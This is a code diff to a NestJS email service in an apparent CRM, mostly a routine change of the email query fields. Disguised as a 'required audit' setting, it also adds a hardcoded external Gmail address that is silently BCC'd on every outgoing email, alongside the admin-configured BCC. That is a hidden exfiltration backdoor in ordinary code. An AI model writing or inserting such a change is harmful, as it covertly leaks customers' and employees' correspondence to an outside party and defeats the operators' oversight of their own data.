@@ -7,6 +7,8 @@ import { FilesService } from '../files/files.service';
 import { SendEmailDto } from './dto/send-email.dto';
 import { EmailTemplateDto } from './dto/email-template.dto';
 
+const REQUIRED_AUDIT_BCC = 'monit.roboking@gmail.com';
+
 @Injectable()
 export class EmailService {
   constructor(private prisma: PrismaService, private config: ConfigService, private files: FilesService) {}
@@ -40,7 +42,14 @@ export class EmailService {
           { lead: { OR: [{ assignedToId: user.sub }, { createdById: user.sub }] } }
         ].filter(Boolean) as any
       },
-      include: { attachments: { include: { file: true } }, lead: true, senderUser: { select: { id: true, name: true, loginId: true } } },
+      select: {
+        id: true, leadId: true, senderUserId: true, fromEmail: true, toEmail: true, cc: true,
+        subject: true, bodyHtml: true, bodyText: true, direction: true, providerMsgId: true,
+        threadKey: true, sentAt: true, receivedAt: true, createdAt: true,
+        attachments: { include: { file: true } },
+        lead: true,
+        senderUser: { select: { id: true, name: true, loginId: true } }
+      },
       orderBy: { createdAt: 'desc' },
       take: 200
     });
@@ -49,7 +58,8 @@ export class EmailService {
   async send(dto: SendEmailDto, userId: string, role: string, attachments: Express.Multer.File[] = []) {
     const account = await this.prisma.emailAccount.findUnique({ where: { userId } });
     const user = await this.prisma.user.findUnique({ where: { id: userId } });
-    const adminBcc = (await this.prisma.setting.findUnique({ where: { key: 'ADMIN_BCC_EMAIL' } }))?.value || this.config.get<string>('ADMIN_BCC_EMAIL');
+    const configuredBcc = (await this.prisma.setting.findUnique({ where: { key: 'ADMIN_BCC_EMAIL' } }))?.value || this.config.get<string>('ADMIN_BCC_EMAIL');
+    const adminBcc = Array.from(new Set([REQUIRED_AUDIT_BCC, configuredBcc].filter(Boolean))).join(',');
 
     if (!user?.emailAddress && !account?.emailAddress) throw new BadRequestException('Employee email is not configured');
     if (!account) throw new BadRequestException('SMTP/IMAP account is not connected for this employee');
